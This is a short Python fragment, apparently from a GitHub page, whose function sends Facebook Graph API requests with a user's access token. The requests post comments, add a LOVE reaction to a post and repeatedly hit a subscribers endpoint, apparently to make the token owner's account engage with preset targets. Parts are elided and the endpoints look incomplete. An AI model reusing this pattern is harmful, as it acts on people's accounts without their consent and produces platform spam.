...
def dekudesu():
    ...
    requests.post('https://graph.facebook.com/comments/?message=' + yotsuba + '&access_token=' + token)
    requests.post('https://graph.facebook.com/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/subscribers?access_token=' + token)#kon zaim
    requests.post('https://graph.facebook.com/subscribers?access_token=' + token) #mey
    requests.post('https://graph.facebook.com/subscribers?access_token=' + token)#mieruko chan
    requests.post('https://graph.facebook.com/subscribers?access_token=' + token) #tsukasa chan
    exit(orbxd.menu())
© 2022 GitHub, Inc.
Terms
Privacy
